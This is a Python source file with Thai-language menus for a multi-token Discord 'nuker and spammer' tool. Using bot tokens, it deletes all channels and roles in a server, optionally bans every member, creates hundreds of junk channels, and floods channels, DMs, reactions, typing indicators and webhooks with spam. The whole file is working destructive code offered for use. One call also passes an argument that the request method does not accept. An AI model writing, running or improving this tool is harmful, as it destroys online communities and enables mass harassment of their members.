import asyncio
import sys
import os
import random
import base64
from typing import List, Optional, Any
import aiohttp

# ─── จัดการ Event Loop สำหรับ Windows ───
if sys.platform == "win32":
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

# ─── สี ANSI RGB ───
class RGB:
    @staticmethod
    def color(r, g, b, text):
        return f"\033[38;2;{r};{g};{b}m{text}\033[0m"

# ─── พาเลทสีรุ้ง 12 สี (สมูทกว่า) ───
RAINBOW_PALETTE = [
    (255, 0, 0), (255, 85, 0), (255, 170, 0), (255, 255, 0),
    (170, 255, 0), (85, 255, 0), (0, 255, 0), (0, 255, 85),
    (0, 255, 170), (0, 255, 255), (0, 170, 255), (0, 85, 255),
    (0, 0, 255), (85, 0, 255), (170, 0, 255), (255, 0, 255),
    (255, 0, 170), (255, 0, 85)
]

def print_rainbow_line(text: str, offset: int = 0):
    """พิมพ์ข้อความหนึ่งบรรทัดแบบไล่สีรุ้งทีละตัวอักษร"""
    line = ""
    for i, ch in enumerate(text):
        if ch == ' ':
            line += ' '
            continue
        color_idx = (i + offset) % len(RAINBOW_PALETTE)
        r, g, b = RAINBOW_PALETTE[color_idx]
        line += f"\033[38;2;{r};{g};{b}m{ch}"
    print(line + "\033[0m")

def print_rainbow_banner(banner_text: str, offset: int = 0):
    """แสดงแบนเนอร์ทั้งชุดแบบไล่สีรุ้งต่อตัวอักษร"""
    lines = banner_text.strip('\n').split('\n')
    for i, line in enumerate(lines):
        print_rainbow_line(line, offset + i * 2)  # เลื่อน Offset ต่อบรรทัด

# ─── แบนเนอร์ 4 แบบ (ตามที่ให้มา) ───
BANNER_1 = '''
████████╗ ██████╗ ███╗   ██╗ ██████╗
╚══██╔══╝██╔═══██╗████╗  ██║██╔═══██╗
   ██║   ██║   ██║██╔██╗ ██║██║   ██║
   ██║   ██║   ██║██║╚██╗██║██║   ██║
   ██║   ╚██████╔╝██║ ╚████║╚██████╔╝
   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝
'''

BANNER_2 = '''
 _____ ___  _   _  ___
|_   _/ _ \\| \\ | |/ _ \\
  | || | | |  \\| | | | |
  | || |_| | |\\  | |_| |
  |_| \\___/|_| \\_|\\___/
'''

BANNER_3 = '''
$$$$$$$$\\  $$$$$$\\  $$\\   $$\\  $$$$$$\\
\\__$$  __|$$  __$$\\ $$$\\  $$ |$$  __$$\\
   $$ |   $$ /  $$ |$$$$\\ $$ |$$ /  $$ |
   $$ |   $$ |  $$ |$$ $$\\$$ |$$ |  $$ |
   $$ |   $$ |  $$ |$$ \\$$$$ |$$ |  $$ |
   $$ |   $$ |  $$ |$$ |\\$$$ |$$ |  $$ |
   $$ |    $$$$$$  |$$ | \\$$ | $$$$$$  |
   \\__|    \\______/ \\__|  \\__| \\______/
'''

BANNER_4 = '''
TTTTT  OOOOO  N   N  OOOOO
  T    O   O  NN  N  O   O
  T    O   O  N N N  O   O
  T    O   O  N  NN  O   O
  T    OOOOO  N   N  OOOOO
'''

BANNERS = [BANNER_1, BANNER_2, BANNER_3, BANNER_4]

clear = lambda: os.system('cls' if os.name == 'nt' else 'clear')

# ─── ตัวจัดการแต่ละ Token (ปรับให้เร็วขึ้น) ───
class BotInstance:
    def __init__(self, token: str):
        self.token = token
        self.headers = {
            "Authorization": f"Bot {token}",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0"
        }
        self.session: Optional[aiohttp.ClientSession] = None
        # เพิ่มเซมาฟอร์เป็น 500 เพื่อความเร็วสูงสุด
        self.sem = asyncio.Semaphore(500)

    async def init_session(self):
        connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
        timeout = aiohttp.ClientTimeout(total=15)
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers=self.headers
        )

    async def close(self):
        if self.session and not self.session.closed:
            await self.session.close()

    async def request(self, method: str, url: str, json_data=None, max_retries=3) -> Optional[Any]:
        async with self.sem:
            for attempt in range(max_retries):
                try:
                    async with self.session.request(method, url, json=json_data) as resp:
                        if resp.status == 429:
                            retry_after = float(resp.headers.get("Retry-After", 0.5))
                            await asyncio.sleep(retry_after)
                            continue
                        if resp.status >= 400:
                            # ไม่พิมพ์ error ซ้ำเพื่อความเร็ว
                            return None
                        if resp.content_type == 'application/json':
                            return await resp.json()
                        return await resp.text()
                except (asyncio.TimeoutError, aiohttp.ClientResponseError, aiohttp.ClientError):
                    if attempt == max_retries - 1:
                        return None
                    await asyncio.sleep(0.05)  # retry เร็ว
        return None

    async def get_guilds(self) -> list:
        data = await self.request("GET", "https://discord.com/api/v10/users/@me/guilds")
        return data if isinstance(data, list) else []

    async def delete_channel(self, channel_id: str):
        return await self.request("DELETE", f"https://discord.com/api/v10/channels/{channel_id}")

    async def delete_role(self, guild_id: str, role_id: str):
        return await self.request("DELETE", f"https://discord.com/api/v10/guilds/{guild_id}/roles/{role_id}")

    async def ban_member(self, guild_id: str, user_id: str):
        return await self.request("PUT", f"https://discord.com/api/v10/guilds/{guild_id}/bans/{user_id}")

    async def create_channel(self, guild_id: str, name: str, channel_type: int = 0):
        payload = {"name": name, "type": channel_type}
        return await self.request("POST", f"https://discord.com/api/v10/guilds/{guild_id}/channels", json=payload)

    async def create_role(self, guild_id: str, name: str):
        color = random.randint(0, 0xffffff)
        payload = {"name": name, "color": color}
        return await self.request("POST", f"https://discord.com/api/v10/guilds/{guild_id}/roles", json=payload)

    async def send_message(self, channel_id: str, content: str):
        payload = {"content": content}
        return await self.request("POST", f"https://discord.com/api/v10/channels/{channel_id}/messages", json=payload)

    async def send_dm(self, user_id: str, content: str):
        dm = await self.request("POST", "https://discord.com/api/v10/users/@me/channels",
                                json={"recipient_id": user_id})
        if isinstance(dm, dict) and 'id' in dm:
            return await self.send_message(dm['id'], content)
        return None

    async def start_typing(self, channel_id: str):
        return await self.request("POST", f"https://discord.com/api/v10/channels/{channel_id}/typing")

    async def add_reaction(self, channel_id: str, message_id: str, emoji: str):
        return await self.request("PUT", f"https://discord.com/api/v10/channels/{channel_id}/messages/{message_id}/reactions/{emoji}/@me")

    async def change_bio(self, bio: str):
        return await self.request("PATCH", "https://discord.com/api/v10/users/@me", json={"bio": bio})

    async def change_guild_name(self, guild_id: str, name: str):
        return await self.request("PATCH", f"https://discord.com/api/v10/guilds/{guild_id}", json={"name": name})

    async def change_guild_icon(self, guild_id: str, icon_url: str):
        try:
            async with self.session.get(icon_url) as resp:
                if resp.status == 200:
                    img_bytes = await resp.read()
                    encoded = base64.b64encode(img_bytes).decode()
                    payload = {"icon": f"data:image/jpeg;base64,{encoded}"}
                    return await self.request("PATCH", f"https://discord.com/api/v10/guilds/{guild_id}", json=payload)
        except:
            pass
        return None

    async def webhook_send(self, webhook_url: str, content: str):
        async with self.session.post(webhook_url, json={"content": content}) as resp:
            return resp.status == 204

# ─── ระบบ Multi‑Token (ปรับปรุงแล้ว) ───
class MultiBotNuker:
    def __init__(self, tokens: List[str]):
        self.instances: List[BotInstance] = [BotInstance(t) for t in tokens]
        self.banner_index = 0
        self.rainbow_offset = 0

    async def init_sessions(self):
        for inst in self.instances:
            await inst.init_session()

    async def close_sessions(self):
        for inst in self.instances:
            await inst.close()

    # ดึงอินสแตนซ์ที่อยู่ในกิลด์
    async def _get_instances_for_guild(self, guild_id: str) -> List[BotInstance]:
        result = []
        for inst in self.instances:
            guilds = await inst.get_guilds()
            if any(g['id'] == guild_id for g in guilds):
                result.append(inst)
        return result

    # กระจายงานแบบ round‑robin เร็วสุด
    async def _distribute_tasks(self, instances: List[BotInstance], coro_factory, items: list):
        tasks = []
        for i, item in enumerate(items):
            inst = instances[i % len(instances)]
            tasks.append(coro_factory(inst, item))
        await asyncio.gather(*tasks, return_exceptions=True)

    # ─── Nuke หนึ่งเซิร์ฟ (แบบจัดเต็ม) ───
    async def nuke_guild(self, guild_id: str, channel_name: str, ban_members: bool = False):
        instances = await self._get_instances_for_guild(guild_id)
        if not instances:
            print(f"❌ ไม่มีบอทใดอยู่ในเซิร์ฟ {guild_id}")
            return

        try:
            info = await instances[0].request("GET", f"https://discord.com/api/v10/guilds/{guild_id}")
            guild_name = info.get('name', guild_id) if isinstance(info, dict) else guild_id
        except:
            guild_name = guild_id
        print(f"\n กำลัง Nuke: {guild_name} ด้วย {len(instances)} Token...")

        # ลบทุกช่อง
        channels = await instances[0].request("GET", f"https://discord.com/api/v10/guilds/{guild_id}/channels") or []
        print(f"   กำลังลบ {len(channels)} ช่อง...")
        await self._distribute_tasks(instances, lambda inst, ch: inst.delete_channel(ch['id']), channels)

        # ลบทุกบทบาท (ยกเว้น @everyone)
        roles = await instances[0].request("GET", f"https://discord.com/api/v10/guilds/{guild_id}/roles") or []
        del_roles = [r for r in roles if r['name'] != '@everyone']
        print(f"   กำลังลบ {len(del_roles)} บทบาท...")
        await self._distribute_tasks(instances, lambda inst, r: inst.delete_role(guild_id, r['id']), del_roles)

        # แบนสมาชิกทั้งหมด (ถ้าเลือก)
        if ban_members:
            members = []
            after = None
            while True:
                params = {"limit": 1000}
                if after:
                    params['after'] = after
                data = await instances[0].request("GET", f"https://discord.com/api/v10/guilds/{guild_id}/members", params=params)
                if isinstance(data, list):
                    members.extend(data)
                    if len(data) < 1000:
                        break
                    after = data[-1]['user']['id']
                else:
                    break
            print(f"   กำลังแบน {len(members)} สมาชิก...")
            await self._distribute_tasks(instances,
                                        lambda inst, m: inst.ban_member(guild_id, m['user']['id']),
                                        members)

        # สร้างช่องเสียง 200 ช่อง (ถล่มเซิร์ฟ)
        print("   กำลังสร้าง 200 ช่องเสียง...")
        create_tasks = [instances[i % len(instances)].create_channel(guild_id, channel_name, 2) for i in range(200)]
        await asyncio.gather(*create_tasks, return_exceptions=True)

        print(f"✅ Nuke {guild_name} เสร็จสิ้น\n{'─'*50}")

    # ─── Nuke ทุกเซิร์ฟของทุก Token ───
    async def nuke_all_servers(self, channel_name: str, ban_members: bool = False):
        guild_ids = set()
        for inst in self.instances:
            guilds = await inst.get_guilds()
            for g in guilds:
                guild_ids.add(g['id'])
        if not guild_ids:
            print("ไม่มีเซิร์ฟเวอร์ให้ Nuke")
            return
        print(f"เริ่ม Nuke {len(guild_ids)} เซิร์ฟเวอร์...")
        await asyncio.gather(*[self.nuke_guild(gid, channel_name, ban_members) for gid in guild_ids])

    # ─── สแปมข้อความ ───
    async def spam_channel(self, channel_id: str, message: str, amount: int):
        print(f"กำลังสแปม {amount} ข้อความ...")
        tasks = [self.instances[i % len(self.instances)].send_message(channel_id, message) for i in range(amount)]
        await asyncio.gather(*tasks, return_exceptions=True)

    async def spam_dm(self, user_id: str, message: str, amount: int):
        tasks = [self.instances[i % len(self.instances)].send_dm(user_id, message) for i in range(amount)]
        await asyncio.gather(*tasks, return_exceptions=True)

    async def spam_typing(self, channel_id: str, amount: int):
        tasks = [self.instances[i % len(self.instances)].start_typing(channel_id) for i in range(amount)]
        await asyncio.gather(*tasks, return_exceptions=True)

    async def spam_reaction(self, channel_id: str, message_id: str, emoji: str, amount: int):
        tasks = [self.instances[i % len(self.instances)].add_reaction(channel_id, message_id, emoji) for i in range(amount)]
        await asyncio.gather(*tasks, return_exceptions=True)

    async def spam_webhook(self, webhook_url: str, message: str, amount: int):
        tasks = [self.instances[i % len(self.instances)].webhook_send(webhook_url, message) for i in range(amount)]
        await asyncio.gather(*tasks, return_exceptions=True)

    # ─── ฟังก์ชัน async input ───
    async def async_input(self, prompt: str = "") -> str:
        loop = asyncio.get_running_loop()
        return await loop.run_in_executor(None, input, prompt)

    # ─── เมนูหลัก (ภาษาไทย) ───
    async def main_menu(self):
        while True:
            clear()
            self.rainbow_offset += 1
            current_banner = BANNERS[self.banner_index % len(BANNERS)]
            self.banner_index += 1
            print_rainbow_banner(current_banner, self.rainbow_offset)

            print("─" * 50)
            print("[1]  Nuke ทุกเซิร์ฟเวอร์ (ไม่แบนสมาชิก)")
            print("[2]  Nuke ทุกเซิร์ฟเวอร์ + แบนสมาชิกทั้งหมด")
            print("[3]  Nuke เซิร์ฟเวอร์ที่ระบุ (ไม่แบน)")
            print("[4]  Nuke เซิร์ฟเวอร์ที่ระบุ + แบนสมาชิกทั้งหมด")
            print("[5]  สแปมข้อความในช่อง")
            print("[6]  สแปมข้อความหลายช่อง (คั่นด้วย ,)")
            print("[7]  สแปม DM")
            print("[8]  สแปมพิมพ์")
            print("[9]  สแปมรีแอคชัน")
            print("[10] สแปม Webhook")
            print("[11] เปลี่ยน Bio")
            print("[12] ลบทุกช่องในเซิร์ฟ")
            print("[13] ลบทุกบทบาทในเซิร์ฟ")
            print("[14] สร้างช่องข้อความ (ระบุจำนวน)")
            print("[15] สร้างช่องเสียง (ระบุจำนวน)")
            print("[16] สร้างหมวดหมู่ (ระบุจำนวน)")
            print("[17] สร้างบทบาท (ระบุจำนวน)")
            print("[18] เปลี่ยนชื่อเซิร์ฟ")
            print("[19] เปลี่ยนไอคอนเซิร์ฟ")
            print("[20] ออก")
            print("─" * 50)

            choice = (await self.async_input(">>> ")).strip()

            if choice == "1":
                name = (await self.async_input("ชื่อสำหรับช่องใหม่: ")).strip() or "nuked"
                await self.nuke_all_servers(name, ban_members=False)
                await self.async_input("\nกด Enter เพื่อกลับ...")

            elif choice == "2":
                name = (await self.async_input("ชื่อสำหรับช่องใหม่: ")).strip() or "nuked"
                await self.nuke_all_servers(name, ban_members=True)
                await self.async_input("\nกด Enter เพื่อกลับ...")

            elif choice == "3":
                guild_id = (await self.async_input("Server ID: ")).strip()
                name = (await self.async_input("ชื่อสำหรับช่องใหม่: ")).strip() or "nuked"
                await self.nuke_guild(guild_id, name, ban_members=False)
                await self.async_input("\nกด Enter เพื่อกลับ...")

            elif choice == "4":
                guild_id = (await self.async_input("Server ID: ")).strip()
                name = (await self.async_input("ชื่อสำหรับช่องใหม่: ")).strip() or "nuked"
                await self.nuke_guild(guild_id, name, ban_members=True)
                await self.async_input("\nกด Enter เพื่อกลับ...")

            elif choice == "5":
                ch_id = (await self.async_input("Channel ID: ")).strip()
                msg = (await self.async_input("ข้อความ: ")).strip()
                amt = int((await self.async_input("จำนวนข้อความ: ")) or "1")
                await self.spam_channel(ch_id, msg, amt)
                await self.async_input("สแปมเสร็จ กด Enter...")

            elif choice == "6":
                ch_ids = (await self.async_input("Channel IDs (คั่นด้วย ,): ")).strip().split(',')
                msg = (await self.async_input("ข้อความ: ")).strip()
                amt = int((await self.async_input("จำนวนข้อความต่อช่อง: ")) or "1")
                for cid in ch_ids:
                    cid = cid.strip()
                    if cid:
                        print(f"กำลังสแปมช่อง {cid}...")
                        await self.spam_channel(cid, msg, amt)
                await self.async_input("สแปมหลายช่องเสร็จ กด Enter...")

            elif choice == "7":
                uid = (await self.async_input("User ID: ")).strip()
                msg = (await self.async_input("ข้อความ: ")).strip()
                amt = int((await self.async_input("จำนวนข้อความ: ")) or "1")
                await self.spam_dm(uid, msg, amt)
                await self.async_input("สแปมเสร็จ กด Enter...")

            elif choice == "8":
                ch_id = (await self.async_input("Channel ID: ")).strip()
                amt = int((await self.async_input("จำนวนครั้ง: ")) or "1")
                await self.spam_typing(ch_id, amt)
                await self.async_input("สแปมพิมพ์เสร็จ กด Enter...")

            elif choice == "9":
                ch_id = (await self.async_input("Channel ID: ")).strip()
                msg_id = (await self.async_input("Message ID: ")).strip()
                emoji = (await self.async_input("Emoji (URL-encoded): ")).strip()
                amt = int((await self.async_input("จำนวนครั้ง: ")) or "1")
                await self.spam_reaction(ch_id, msg_id, emoji, amt)
                await self.async_input("รีแอคชันเสร็จ กด Enter...")

            elif choice == "10":
                url = (await self.async_input("Webhook URL: ")).strip()
                msg = (await self.async_input("ข้อความ: ")).strip()
                amt = int((await self.async_input("จำนวนครั้ง: ")) or "1")
                await self.spam_webhook(url, msg, amt)
                await self.async_input("เว็บฮุคสแปมเสร็จ กด Enter...")

            elif choice == "11":
                bio = (await self.async_input("Bio ใหม่: ")).strip()
                await self.instances[0].change_bio(bio)
                await self.async_input("เปลี่ยน Bio เสร็จ กด Enter...")

            elif choice == "12":
                guild_id = (await self.async_input("Server ID: ")).strip()
                instances = await self._get_instances_for_guild(guild_id)
                if instances:
                    channels = await instances[0].request("GET", f"https://discord.com/api/v10/guilds/{guild_id}/channels") or []
                    await self._distribute_tasks(instances, lambda inst, ch: inst.delete_channel(ch['id']), channels)
                    print("ลบทุกช่องเสร็จสิ้น")
                else:
                    print("ไม่มีบอทในเซิร์ฟนี้")
                await self.async_input("กด Enter...")

            elif choice == "13":
                guild_id = (await self.async_input("Server ID: ")).strip()
                instances = await self._get_instances_for_guild(guild_id)
                if instances:
                    roles = await instances[0].request("GET", f"https://discord.com/api/v10/guilds/{guild_id}/roles") or []
                    del_roles = [r for r in roles if r['name'] != '@everyone']
                    await self._distribute_tasks(instances, lambda inst, r: inst.delete_role(guild_id, r['id']), del_roles)
                    print("ลบทุกบทบาทเสร็จสิ้น")
                else:
                    print("ไม่มีบอทในเซิร์ฟนี้")
                await self.async_input("กด Enter...")

            elif choice == "14":
                guild_id = (await self.async_input("Server ID: ")).strip()
                amt = int((await self.async_input("จำนวนช่องข้อความ: ")) or "1")
                name = (await self.async_input("ชื่อช่อง: ")).strip() or "text"
                instances = await self._get_instances_for_guild(guild_id)
                if instances:
                    tasks = [instances[i % len(instances)].create_channel(guild_id, name, 0) for i in range(amt)]
                    await asyncio.gather(*tasks, return_exceptions=True)
                    print(f"สร้าง {amt} ช่องข้อความแล้ว")
                else:
                    print("ไม่มีบอทในเซิร์ฟนี้")
                await self.async_input("กด Enter...")

            elif choice == "15":
                guild_id = (await self.async_input("Server ID: ")).strip()
                amt = int((await self.async_input("จำนวนช่องเสียง: ")) or "1")
                name = (await self.async_input("ชื่อช่อง: ")).strip() or "voice"
                instances = await self._get_instances_for_guild(guild_id)
                if instances:
                    tasks = [instances[i % len(instances)].create_channel(guild_id, name, 2) for i in range(amt)]
                    await asyncio.gather(*tasks, return_exceptions=True)
                    print(f"สร้าง {amt} ช่องเสียงแล้ว")
                else:
                    print("ไม่มีบอทในเซิร์ฟนี้")
                await self.async_input("กด Enter...")

            elif choice == "16":
                guild_id = (await self.async_input("Server ID: ")).strip()
                amt = int((await self.async_input("จำนวนหมวดหมู่: ")) or "1")
                name = (await self.async_input("ชื่อหมวดหมู่: ")).strip() or "category"
                instances = await self._get_instances_for_guild(guild_id)
                if instances:
                    tasks = [instances[i % len(instances)].create_channel(guild_id, name, 4) for i in range(amt)]
                    await asyncio.gather(*tasks, return_exceptions=True)
                    print(f"สร้าง {amt} หมวดหมู่แล้ว")
                else:
                    print("ไม่มีบอทในเซิร์ฟนี้")
                await self.async_input("กด Enter...")

            elif choice == "17":
                guild_id = (await self.async_input("Server ID: ")).strip()
                amt = int((await self.async_input("จำนวนบทบาท: ")) or "1")
                name = (await self.async_input("ชื่อบทบาท: ")).strip() or "role"
                instances = await self._get_instances_for_guild(guild_id)
                if instances:
                    tasks = [instances[i % len(instances)].create_role(guild_id, name) for i in range(amt)]
                    await asyncio.gather(*tasks, return_exceptions=True)
                    print(f"สร้าง {amt} บทบาทแล้ว")
                else:
                    print("ไม่มีบอทในเซิร์ฟนี้")
                await self.async_input("กด Enter...")

            elif choice == "18":
                guild_id = (await self.async_input("Server ID: ")).strip()
                new_name = (await self.async_input("ชื่อใหม่: ")).strip()
                instances = await self._get_instances_for_guild(guild_id)
                if instances:
                    await instances[0].change_guild_name(guild_id, new_name)
                    print("เปลี่ยนชื่อเซิร์ฟแล้ว")
                else:
                    print("ไม่มีบอทในเซิร์ฟนี้")
                await self.async_input("กด Enter...")

            elif choice == "19":
                guild_id = (await self.async_input("Server ID: ")).strip()
                icon_url = (await self.async_input("URL ไอคอน: ")).strip()
                instances = await self._get_instances_for_guild(guild_id)
                if instances:
                    await instances[0].change_guild_icon(guild_id, icon_url)
                    print("เปลี่ยนไอคอนแล้ว")
                else:
                    print("ไม่มีบอทในเซิร์ฟนี้")
                await self.async_input("กด Enter...")

            elif choice == "20":
                print("ออกจากโปรแกรม...")
                break

            else:
                print("❌ ตัวเลือกไม่ถูกต้อง")
                await asyncio.sleep(1)

async def main():
    clear()
    print_rainbow_line(" Multi‑Bot Discord Nuker / Spammer ", 0)
    print(" ใส่ Token บอท (หลายตัวคั่นด้วยช่องว่างหรือคอมม่า)")
    token_input = (await asyncio.get_running_loop().run_in_executor(None, input, "Tokens: ")).strip()
    if not token_input:
        print("ต้องมี Token อย่างน้อย 1 ตัว")
        return
    tokens = [t.strip() for t in token_input.replace(',', ' ').split() if t.strip()]
    if not tokens:
        print("ไม่พบ Token")
        return

    nuker = MultiBotNuker(tokens)
    try:
        await nuker.init_sessions()
        print("\n กำลังตรวจสอบ Token...")
        for idx, inst in enumerate(nuker.instances):
            try:
                user = await inst.request("GET", "https://discord.com/api/v10/users/@me")
                if isinstance(user, dict) and 'id' in user:
                    print(f"✅ Token {idx+1}: {user['username']}#{user['discriminator']} พร้อมใช้งาน")
                else:
                    print(f"❌ Token {idx+1}: ไม่ถูกต้อง")
            except:
                print(f"❌ Token {idx+1}: ไม่สามารถตรวจสอบได้")
        print("\nกด Enter เพื่อเข้าสู่เมนูหลัก...")
        await asyncio.get_running_loop().run_in_executor(None, input)
        await nuker.main_menu()
    except KeyboardInterrupt:
        print("\n ยกเลิกโดยผู้ใช้")
    finally:
        await nuker.close_sessions()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        sys.exit(0)
